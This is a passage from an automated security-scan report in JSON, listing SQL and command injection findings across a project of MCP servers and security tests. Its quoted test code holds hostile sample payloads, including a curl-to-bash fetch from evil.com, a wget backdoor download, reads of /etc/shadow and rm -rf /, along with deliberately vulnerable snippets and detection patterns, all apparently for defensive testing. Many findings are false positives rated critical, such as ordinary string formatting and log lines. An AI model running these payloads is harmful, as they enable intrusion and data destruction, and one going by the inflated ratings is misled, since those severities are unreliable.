            "context": "        if direction == '':\n            # String likely comes from a newer version of Unicode\n            raise IDNABidiError('Unknown directionality in label {} at position {}'.format(repr(label), idx))\n        if direction in ['R', 'AL', 'AN']:\n            bidi_label = True",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/fields.py",
            "line": 75,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "six.unichr(cc): u\"%{:02X}\".format(cc)",
            "context": "_HTML5_REPLACEMENTS.update(\n    {\n        six.unichr(cc): u\"%{:02X}\".format(cc)\n        for cc in range(0x00, 0x1F + 1)\n        if cc not in (0x1B,)",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/packaging/tags.py",
            "line": 163,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"cp{version}{debug}{pymalloc}{ucs4}\".format(",
            "context": "    abis.insert(\n        0,\n        \"cp{version}{debug}{pymalloc}{ucs4}\".format(\n            version=version, debug=debug, pymalloc=pymalloc, ucs4=ucs4\n        ),",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/rich/progress.py",
            "line": 624,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "_text = self.text_format.format(task=task)",
            "context": "\n    def render(self, task: \"Task\") -> Text:\n        _text = self.text_format.format(task=task)\n        if self.markup:\n            text = Text.from_markup(_text, style=self.style, justify=self.justify)",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/rich/progress.py",
            "line": 751,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "_text = text_format.format(task=task)",
            "context": "            self.text_format_no_percentage if task.total is None else self.text_format\n        )\n        _text = text_format.format(task=task)\n        if self.markup:\n            text = Text.from_markup(_text, style=self.style, justify=self.justify)",
            "cvss_score": 9.8
          },
          {
            "file": "src/utils/git.py",
            "line": 334,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "remote_url = service_config['ssh_format'].format(repo_path)",
            "context": "            \n            # Use SSH format by default\n            remote_url = service_config['ssh_format'].format(repo_path)\n            \n            # Add or update remote",
            "cvss_score": 9.8
          },
          {
            "file": "src/mcp/devops_servers.py",
            "line": 621,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "wiql = f\"SELECT [System.Id], [System.Title], [System.State] FROM WorkItems WHERE {' AND '.join(conditions)}\"",
            "context": "                conditions.append(f\"[System.State] = '{state}'\")\n            \n            wiql = f\"SELECT [System.Id], [System.Title], [System.State] FROM WorkItems WHERE {' AND '.join(conditions)}\"\n        \n        url = f\"{self.base_url}/{project}/_apis/wit/wiql?api-version=7.0\"",
            "cvss_score": 9.8
          },
          {
            "file": "src/database/init.py",
            "line": 132,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "result = await session.execute(f\"SELECT 1 FROM {table} LIMIT 1\")",
            "context": "                \n                for table in tables_to_check:\n                    result = await session.execute(f\"SELECT 1 FROM {table} LIMIT 1\")\n                    logger.debug(f\"Table {table} verified\")\n                ",
            "cvss_score": 9.8
          },
          {
            "file": "src/database/init.py",
            "line": 233,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "result = await session.execute(text(f\"SELECT COUNT(*) FROM {table}\"))",
            "context": "                \n                for table in tables:\n                    result = await session.execute(text(f\"SELECT COUNT(*) FROM {table}\"))\n                    count = result.scalar()\n                    table_counts[table] = count",
            "cvss_score": 9.8
          },
          {
            "file": "test_environments/circle_experts/strategy_selector.py",
            "line": 231,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "self.logger.info(f\"Selected strategy: {strategy['name']} with {strategy['confidence']:.2f} confidence\")",
            "context": "            self._store_selection(strategy, consensus, context)\n            \n            self.logger.info(f\"Selected strategy: {strategy['name']} with {strategy['confidence']:.2f} confidence\")\n            return strategy\n            ",
            "cvss_score": 9.8
          },
          {
            "file": "test_environments/circle_experts/strategy_selector.py",
            "line": 898,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "reasoning_parts.append(f\"Selected {selected.name} with {selected.success_probability:.1%} success probability\")",
            "context": "        \n        # Primary selection factors\n        reasoning_parts.append(f\"Selected {selected.name} with {selected.success_probability:.1%} success probability\")\n        reasoning_parts.append(f\"Expert consensus score: {selected.expert_scores.get('overall', 0.5):.2f}\")\n        reasoning_parts.append(f\"Strategy complexity: {selected.complexity.value}\")",
            "cvss_score": 9.8
          },
          {
            "file": "test_environments/load_generators/generators/application_load_generator.py",
            "line": 511,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"read\": f\"SELECT * FROM {table} WHERE id = ?\",",
            "context": "        complexity_queries = {\n            \"simple\": {\n                \"read\": f\"SELECT * FROM {table} WHERE id = ?\",\n                \"write\": f\"INSERT INTO {table} (data) VALUES (?)\",\n                \"update\": f\"UPDATE {table} SET status = ? WHERE id = ?\",",
            "cvss_score": 9.8
          },
          {
            "file": "test_environments/load_generators/generators/application_load_generator.py",
            "line": 517,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "\"read\": f\"SELECT t1.*, t2.name FROM {table} t1 JOIN related t2 ON t1.id = t2.{table}_id WHERE t1.created_at > ?\",",
            "context": "            },\n            \"medium\": {\n                \"read\": f\"SELECT t1.*, t2.name FROM {table} t1 JOIN related t2 ON t1.id = t2.{table}_id WHERE t1.created_at > ?\",\n                \"write\": f\"INSERT INTO {table} (data, metadata, created_at) VALUES (?, ?, NOW())\",\n                \"update\": f\"UPDATE {table} SET data = ?, updated_at = NOW() WHERE status = ? AND created_at > ?\",",
            "cvss_score": 9.8
          },
          {
            "file": "rust_core/security_audit_env/mcp_learning_system/servers/quality/test_quality_server.py",
            "line": 130,
            "severity": "CRITICAL",
            "vulnerability": "SQL_INJECTION",
            "evidence": "logger.info(f\"Selected {len(selected_tests)} high-priority tests\")",
            "context": "        # Sort by failure probability\n        selected_tests.sort(key=lambda x: x[\"failure_probability\"], reverse=True)\n        logger.info(f\"Selected {len(selected_tests)} high-priority tests\")\n        \n        # Verify test prioritization",
            "cvss_score": 9.8
          }
        ]
      },
      "command_injection_scan": {
        "status": "completed",
        "vulnerabilities_found": 1424,
        "critical_command_injections": 16,
        "high_risk_command_injections": 1408,
        "findings": [
          {
            "file": "test_mcp_server_functionality.py",
            "line": 137,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "[sys.executable, \"-c\", f\"import sys; sys.path.insert(0, '.'); exec(open('{server['main_file']}').read())\"],",
            "context": "            try:\n                # Try a dry run import check\n                result = subprocess.run(\n                    [sys.executable, \"-c\", f\"import sys; sys.path.insert(0, '.'); exec(open('{server['main_file']}').read())\"],\n                    capture_output=True,\n                    text=True,\n                    timeout=5",
            "cvss_score": 7.5
          },
          {
            "file": "security_audit_test.py",
            "line": 41,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "\"';exec('id');#\",",
            "context": "        \"`curl http://evil.com/shell.sh | bash`\",\n        \"$(wget http://malicious.com/backdoor -O /tmp/backdoor && chmod +x /tmp/backdoor && /tmp/backdoor)\",\n        \"${IFS}cat${IFS}/etc/shadow\",\n        \"';exec('id');#\",\n        \"'; DROP TABLE users; --\",\n    ],\n    \"path_traversal\": [",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_performance_validation_suite.py",
            "line": 149,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)",
            "context": "                if server['type'] == 'typescript':\n                    # Start TypeScript server\n                    cmd = f\"cd /home/louranicas/projects/claude-optimized-deployment/mcp_servers && npm run dev -- --port {server['port']}\"\n                    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n                    \n                elif server['type'] == 'python':\n                    # Start Python server",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_performance_validation_suite.py",
            "line": 154,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)",
            "context": "                elif server['type'] == 'python':\n                    # Start Python server\n                    cmd = f\"cd /home/louranicas/projects/claude-optimized-deployment && python -m venv_mcp.bin.python {server['path']} --port {server['port']}\"\n                    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n                    \n                elif server['type'] == 'rust':\n                    # Build and start Rust server",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_performance_validation_suite.py",
            "line": 159,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)",
            "context": "                elif server['type'] == 'rust':\n                    # Build and start Rust server\n                    cmd = f\"cd {server['path']} && cargo run -- --port {server['port']}\"\n                    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n                \n                server['process'] = process\n                started_servers.append(server)",
            "cvss_score": 7.5
          },
          {
            "file": "test_log_injection_prevention.py",
            "line": 88,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "\"Command: eval(malicious_code)\",",
            "context": "        \"2024-01-01 00:00:00 ERROR Fake log entry\",\n        \"User query: <script>alert('xss')</script>\",\n        \"Path: ../../../etc/passwd\",\n        \"Command: eval(malicious_code)\",\n        \"JSON: {\\\"level\\\":\\\"ERROR\\\",\\\"message\\\":\\\"fake\\\"}\",\n        \"Log level: INFO Something happened\",\n        \"Syslog: <134>Jan 01 00:00:00 fake\",",
            "cvss_score": 7.5
          },
          {
            "file": "security_audit_phase2.py",
            "line": 38,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "if 'eval(' in content or 'exec(' in content:",
            "context": "                        content = f.read()\n                        \n                        # Check for eval/exec\n                        if 'eval(' in content or 'exec(' in content:\n                            dangerous_imports.append({\n                                \"file\": filepath,\n                                \"type\": \"DANGEROUS_FUNCTION\",",
            "cvss_score": 7.5
          },
          {
            "file": "security_audit_phase2.py",
            "line": 38,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "if 'eval(' in content or 'exec(' in content:",
            "context": "                        content = f.read()\n                        \n                        # Check for eval/exec\n                        if 'eval(' in content or 'exec(' in content:\n                            dangerous_imports.append({\n                                \"file\": filepath,\n                                \"type\": \"DANGEROUS_FUNCTION\",",
            "cvss_score": 7.5
          },
          {
            "file": "security_audit_phase2.py",
            "line": 43,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "\"details\": \"Use of eval() or exec() found\"",
            "context": "                                \"file\": filepath,\n                                \"type\": \"DANGEROUS_FUNCTION\",\n                                \"severity\": \"HIGH\",\n                                \"details\": \"Use of eval() or exec() found\"\n                            })\n                            \n                        # Check for pickle (can execute arbitrary code)",
            "cvss_score": 7.5
          },
          {
            "file": "security_audit_phase2.py",
            "line": 43,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "\"details\": \"Use of eval() or exec() found\"",
            "context": "                                \"file\": filepath,\n                                \"type\": \"DANGEROUS_FUNCTION\",\n                                \"severity\": \"HIGH\",\n                                \"details\": \"Use of eval() or exec() found\"\n                            })\n                            \n                        # Check for pickle (can execute arbitrary code)",
            "cvss_score": 7.5
          },
          {
            "file": "agent_6_real_mcp_server_tests.py",
            "line": 458,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "[sys.executable, '-c', f'import sys; sys.path.insert(0, \"{script_path.parent}\"); exec(open(\"{script_path}\").read())'],",
            "context": "            \n            # Try to run the script as a subprocess to test imports\n            process = subprocess.Popen(\n                [sys.executable, '-c', f'import sys; sys.path.insert(0, \"{script_path.parent}\"); exec(open(\"{script_path}\").read())'],\n                stdout=subprocess.PIPE,\n                stderr=subprocess.PIPE,\n                text=True",
            "cvss_score": 7.5
          },
          {
            "file": "test_mcp_security_integration.py",
            "line": 70,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "os.system(cmd)  # Vulnerable",
            "context": "# Command injection vulnerability\ndef backup_data(filename):\n    cmd = \"tar -czf backup.tar.gz \" + filename\n    os.system(cmd)  # Vulnerable\n\n# Hardcoded secret\nAPI_KEY = \"sk_live_abcd1234567890\"",
            "cvss_score": 7.5
          },
          {
            "file": "test_mcp_security_integration.py",
            "line": 82,
            "severity": "CRITICAL",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = eval(user_input)  # Dangerous",
            "context": "\n# Eval vulnerability\ndef process_input(user_input):\n    result = eval(user_input)  # Dangerous\n    return result\n'''\n            ",
            "cvss_score": 9.8
          },
          {
            "file": "test_mcp_security_integration.py",
            "line": 120,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(`backup.sh ${req.body.filename}`, (err, stdout) => {  // Vulnerable",
            "context": "// Command injection\nconst { exec } = require('child_process');\napp.post('/backup', (req, res) => {\n    exec(`backup.sh ${req.body.filename}`, (err, stdout) => {  // Vulnerable\n        res.send(stdout);\n    });\n});",
            "cvss_score": 7.5
          },
          {
            "file": "test_mcp_security_comprehensive.py",
            "line": 558,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "os.system(\"ls \" + user_input)  # Command injection risk",
            "context": "# Security issues for testing\npassword = \"hardcoded123\"  # Hardcoded password\nquery = \"SELECT * FROM users WHERE id = %s\" % user_id  # SQL injection risk\nos.system(\"ls \" + user_input)  # Command injection risk\nhash_value = hashlib.md5(data).hexdigest()  # Weak crypto\nrandom_number = random.random()  # Insecure random\n            \"\"\")",
            "cvss_score": 7.5
          },
          {
            "file": "test_mcp_security_comprehensive.py",
            "line": 567,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "eval(user_input);  // Use of eval",
            "context": "            js_file = Path(temp_dir) / \"test.js\"\n            js_file.write_text(\"\"\"\n// Security issues for testing\neval(user_input);  // Use of eval\nconst api_key = \"sk-1234567890abcdef\";  // Hardcoded secret\nelement.innerHTML = \"Hello \" + user_name;  // Unsafe innerHTML\n            \"\"\")",
            "cvss_score": 7.5
          },
          {
            "file": "test_log_sanitization_simple.py",
            "line": 210,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "\"Command: eval(code)\",",
            "context": "        \"2024-01-01 00:00:00 ERROR Fake log\",\n        \"User: <script>alert('xss')</script>\",\n        \"Path: ../../../etc/passwd\",\n        \"Command: eval(code)\",\n    ]\n    \n    for dangerous_input in dangerous_inputs:",
            "cvss_score": 7.5
          },
          {
            "file": "test_log_sanitization_simple.py",
            "line": 252,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "\"Command: eval(process.exit(1)); rm -rf /\"",
            "context": "        \"User login: admin\\r\\n\"\n        \"2024-01-01 00:00:00 ERROR [FAKE] Unauthorized access detected\\n\"\n        \"IP: 192.168.1.1 - GET /admin <script>alert('xss')</script>\\r\\n\"\n        \"Command: eval(process.exit(1)); rm -rf /\"\n    )\n    \n    sanitizer = LogSanitizer()",
            "cvss_score": 7.5
          },
          {
            "file": "test_production_modules_comprehensive.py",
            "line": 379,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "(test_dir / \"app.py\").write_text(\"eval(user_input)\")",
            "context": "            (test_dir / \"config.py\").write_text(\"API_KEY = 'sk_test_1234567890abcdef'\")\n            \n            # Create file with potential vulnerability\n            (test_dir / \"app.py\").write_text(\"eval(user_input)\")\n            \n            # Create file with high entropy string\n            (test_dir / \"secrets.env\").write_text(\"SECRET=aB3dEf7GhI9jKlM2nOpQrS5tUvWxYz\")",
            "cvss_score": 7.5
          },
          {
            "file": "security_audit_phase3_infrastructure.py",
            "line": 241,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "git_check = os.popen(f\"git ls-files {env_file} 2>/dev/null\").read().strip()",
            "context": "                \n    for env_file in env_files:\n        # Check if .env file is in git\n        git_check = os.popen(f\"git ls-files {env_file} 2>/dev/null\").read().strip()\n        if git_check:\n            secrets_issues.append({\n                \"file\": env_file,",
            "cvss_score": 7.5
          },
          {
            "file": "agent4_comprehensive_security_audit.py",
            "line": 394,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "r'(?i)subprocess\\.call.*shell\\s*=\\s*True',  # subprocess.call with shell=True",
            "context": "                r'(?i)os\\.popen\\s*\\(',  # os.popen usage\n                r'(?i)eval\\s*\\(',  # eval usage\n                r'(?i)exec\\s*\\(',  # exec usage\n                r'(?i)subprocess\\.call.*shell\\s*=\\s*True',  # subprocess.call with shell=True\n            ]\n            \n            findings = []",
            "cvss_score": 7.5
          },
          {
            "file": "agent4_comprehensive_security_audit.py",
            "line": 394,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "r'(?i)subprocess\\.call.*shell\\s*=\\s*True',  # subprocess.call with shell=True",
            "context": "                r'(?i)os\\.popen\\s*\\(',  # os.popen usage\n                r'(?i)eval\\s*\\(',  # eval usage\n                r'(?i)exec\\s*\\(',  # exec usage\n                r'(?i)subprocess\\.call.*shell\\s*=\\s*True',  # subprocess.call with shell=True\n            ]\n            \n            findings = []",
            "cvss_score": 7.5
          },
          {
            "file": "test_security_mcp_servers_comprehensive.py",
            "line": 95,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec('ls ' + userInput);",
            "context": "                    \n                    // Command injection\n                    const exec = require('child_process').exec;\n                    exec('ls ' + userInput);\n                    \n                    // Hardcoded secrets\n                    const API_KEY = 'sk_live_4242424242424242424242';",
            "cvss_score": 7.5
          },
          {
            "file": "test_security_mcp_servers_comprehensive.py",
            "line": 132,
            "severity": "CRITICAL",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "os.system(f'ping -c 4 {host}')",
            "context": "                    @app.route('/ping')\n                    def ping():\n                        host = request.args.get('host')\n                        os.system(f'ping -c 4 {host}')\n                    \n                    # Insecure deserialization\n                    @app.route('/load')",
            "cvss_score": 9.8
          },
          {
            "file": "test_security_mcp_servers_comprehensive.py",
            "line": 857,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "os.system(f\"echo {{user_input}}\")",
            "context": "    cursor.execute(query)\n    \n    # Command injection\n    os.system(f\"echo {{user_input}}\")\n    \n    # Hardcoded secret\n    api_key_{i} = \"sk_test_{''.join(random.choices(string.ascii_letters + string.digits, k=32))}\"",
            "cvss_score": 7.5
          },
          {
            "file": "full_stack_review.py",
            "line": 478,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(import_stmt)",
            "context": "        \n        for name, import_stmt in critical_imports:\n            try:\n                exec(import_stmt)\n                results[name] = 'success'\n            except Exception as e:\n                results[name] = f'failed: {str(e)}'",
            "cvss_score": 7.5
          },
          {
            "file": "tests/continuous_testing.py",
            "line": 292,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "                \n        # Run tests\n        start_time = time.time()\n        process = await asyncio.create_subprocess_exec(\n            *cmd,\n            stdout=asyncio.subprocess.PIPE,\n            stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "monitoring/setup_monitoring_stack.py",
            "line": 672,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "health_check_process = await asyncio.create_subprocess_exec(",
            "context": "    async def _start_monitoring_automation(self):\n        \"\"\"Start automated monitoring processes\"\"\"\n        # Start health checks\n        health_check_process = await asyncio.create_subprocess_exec(\n            \"python3\", str(self.monitoring_dir / \"mcp_health_checks.py\"),\n            \"--continuous\", \"--interval\", \"60\",\n            stdout=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "monitoring/setup_monitoring_stack.py",
            "line": 680,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "metrics_process = await asyncio.create_subprocess_exec(",
            "context": "        )\n        \n        # Start metrics collection\n        metrics_process = await asyncio.create_subprocess_exec(\n            \"python3\", str(self.monitoring_dir / \"mcp_metrics_collector.py\"),\n            \"--continuous\", \"--interval\", \"30\",\n            stdout=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/final_production_validation.py",
            "line": 292,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "subprocess.run(cmd, shell=True, capture_output=True)",
            "context": "        \n        for cmd in test_commands:\n            start = time.time()\n            subprocess.run(cmd, shell=True, capture_output=True)\n            execution_times.append(time.time() - start)\n        \n        avg_time = sum(execution_times) / len(execution_times)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/add_missing_commands.py",
            "line": 76,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "\"command_template\": \"find / -name '*.php' -type f -exec grep -l 'eval(base64_decode\\\\|eval(gzinflate\\\\|eval(str_rot13\\\\|shell_exec\\\\|system(' {{}} \\\\; 2>/dev/null | head -n {limit}\",",
            "context": "                \"id\": \"sec_detect_backdoors\",\n                \"name\": \"Detect Common Backdoors\",\n                \"description\": \"Scan for common backdoor signatures and suspicious files\",\n                \"command_template\": \"find / -name '*.php' -type f -exec grep -l 'eval(base64_decode\\\\|eval(gzinflate\\\\|eval(str_rot13\\\\|shell_exec\\\\|system(' {{}} \\\\; 2>/dev/null | head -n {limit}\",\n                \"category\": CommandCategory.SECURITY_MONITORING,\n                \"safety_level\": SafetyLevel.MEDIUM_RISK,\n                \"parameters\": [{\"name\": \"limit\", \"type\": \"int\", \"default\": 50}],",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/add_missing_commands.py",
            "line": 76,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "\"command_template\": \"find / -name '*.php' -type f -exec grep -l 'eval(base64_decode\\\\|eval(gzinflate\\\\|eval(str_rot13\\\\|shell_exec\\\\|system(' {{}} \\\\; 2>/dev/null | head -n {limit}\",",
            "context": "                \"id\": \"sec_detect_backdoors\",\n                \"name\": \"Detect Common Backdoors\",\n                \"description\": \"Scan for common backdoor signatures and suspicious files\",\n                \"command_template\": \"find / -name '*.php' -type f -exec grep -l 'eval(base64_decode\\\\|eval(gzinflate\\\\|eval(str_rot13\\\\|shell_exec\\\\|system(' {{}} \\\\; 2>/dev/null | head -n {limit}\",\n                \"category\": CommandCategory.SECURITY_MONITORING,\n                \"safety_level\": SafetyLevel.MEDIUM_RISK,\n                \"parameters\": [{\"name\": \"limit\", \"type\": \"int\", \"default\": 50}],",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/add_missing_commands.py",
            "line": 76,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "\"command_template\": \"find / -name '*.php' -type f -exec grep -l 'eval(base64_decode\\\\|eval(gzinflate\\\\|eval(str_rot13\\\\|shell_exec\\\\|system(' {{}} \\\\; 2>/dev/null | head -n {limit}\",",
            "context": "                \"id\": \"sec_detect_backdoors\",\n                \"name\": \"Detect Common Backdoors\",\n                \"description\": \"Scan for common backdoor signatures and suspicious files\",\n                \"command_template\": \"find / -name '*.php' -type f -exec grep -l 'eval(base64_decode\\\\|eval(gzinflate\\\\|eval(str_rot13\\\\|shell_exec\\\\|system(' {{}} \\\\; 2>/dev/null | head -n {limit}\",\n                \"category\": CommandCategory.SECURITY_MONITORING,\n                \"safety_level\": SafetyLevel.MEDIUM_RISK,\n                \"parameters\": [{\"name\": \"limit\", \"type\": \"int\", \"default\": 50}],",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/add_missing_commands.py",
            "line": 80,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "\"examples\": [\"find /var/www -name '*.php' -exec grep -l 'eval(' {} \\\\;\"],",
            "context": "                \"category\": CommandCategory.SECURITY_MONITORING,\n                \"safety_level\": SafetyLevel.MEDIUM_RISK,\n                \"parameters\": [{\"name\": \"limit\", \"type\": \"int\", \"default\": 50}],\n                \"examples\": [\"find /var/www -name '*.php' -exec grep -l 'eval(' {} \\\\;\"],\n                \"performance_hints\": [\"Limit search scope\", \"Use parallel processing\"],\n                \"dependencies\": [\"find\", \"grep\"]\n            },",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/add_missing_commands.py",
            "line": 332,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "\"examples\": [\"find /var/www -name '*.php' -exec grep -l 'eval(' {} \\\\;\"],",
            "context": "                \"category\": CommandCategory.SECURITY_MONITORING,\n                \"safety_level\": SafetyLevel.SAFE,\n                \"parameters\": [{\"name\": \"webroot\", \"type\": \"string\", \"default\": \"/var/www\"}],\n                \"examples\": [\"find /var/www -name '*.php' -exec grep -l 'eval(' {} \\\\;\"],\n                \"performance_hints\": [\"Regular scanning\", \"Use YARA rules\"],\n                \"dependencies\": [\"find\", \"grep\"]\n            },",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/circle_of_experts_validation.py",
            "line": 413,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "if 'os.system(' in content:",
            "context": "                content = f.read()\n            \n            # Check for dangerous patterns\n            if 'os.system(' in content:\n                issues.append(\"Using os.system() - vulnerable to injection\")\n                score -= 0.3\n                recommendations.append(\"Replace os.system with subprocess.run\")",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/circle_of_experts_validation.py",
            "line": 414,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "issues.append(\"Using os.system() - vulnerable to injection\")",
            "context": "            \n            # Check for dangerous patterns\n            if 'os.system(' in content:\n                issues.append(\"Using os.system() - vulnerable to injection\")\n                score -= 0.3\n                recommendations.append(\"Replace os.system with subprocess.run\")\n            ",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/circle_of_experts_validation.py",
            "line": 418,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "if 'eval(' in content:",
            "context": "                score -= 0.3\n                recommendations.append(\"Replace os.system with subprocess.run\")\n            \n            if 'eval(' in content:\n                issues.append(\"Using eval() - security risk\")\n                score -= 0.2\n                recommendations.append(\"Remove eval() usage\")",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/circle_of_experts_validation.py",
            "line": 419,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "issues.append(\"Using eval() - security risk\")",
            "context": "                recommendations.append(\"Replace os.system with subprocess.run\")\n            \n            if 'eval(' in content:\n                issues.append(\"Using eval() - security risk\")\n                score -= 0.2\n                recommendations.append(\"Remove eval() usage\")\n            ",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/circle_of_experts_validation.py",
            "line": 421,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "recommendations.append(\"Remove eval() usage\")",
            "context": "            if 'eval(' in content:\n                issues.append(\"Using eval() - security risk\")\n                score -= 0.2\n                recommendations.append(\"Remove eval() usage\")\n            \n            # Check for safe practices\n            if 'subprocess.run' in content and 'shell=False' in content:",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_remediation.py",
            "line": 272,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "# Replace subprocess.call with subprocess.run and remove shell=True",
            "context": "                with open(file_path, 'r') as f:\n                    content = f.read()\n                \n                # Replace subprocess.call with subprocess.run and remove shell=True\n                content = re.sub(\n                    r'subprocess\\.call\\s*\\([^)]*shell\\s*=\\s*True[^)]*\\)',\n                    'subprocess.run(cmd_list, check=True)',",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_remediation.py",
            "line": 272,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "# Replace subprocess.call with subprocess.run and remove shell=True",
            "context": "                with open(file_path, 'r') as f:\n                    content = f.read()\n                \n                # Replace subprocess.call with subprocess.run and remove shell=True\n                content = re.sub(\n                    r'subprocess\\.call\\s*\\([^)]*shell\\s*=\\s*True[^)]*\\)',\n                    'subprocess.run(cmd_list, check=True)',",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_scan.py",
            "line": 101,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "\"command_injection\": [\"os.system(\", \"subprocess.call(\"],",
            "context": "        patterns = {\n            \"hardcoded_secrets\": [\"password=\", \"secret=\", \"api_key=\"],\n            \"sql_injection\": [\"execute(\", \"raw(\"],\n            \"command_injection\": [\"os.system(\", \"subprocess.call(\"],\n            \"path_traversal\": [\"../\", \"..\\\\\\\\\"]\n        }\n        ",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/run_enhanced_security_audit.py",
            "line": 385,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
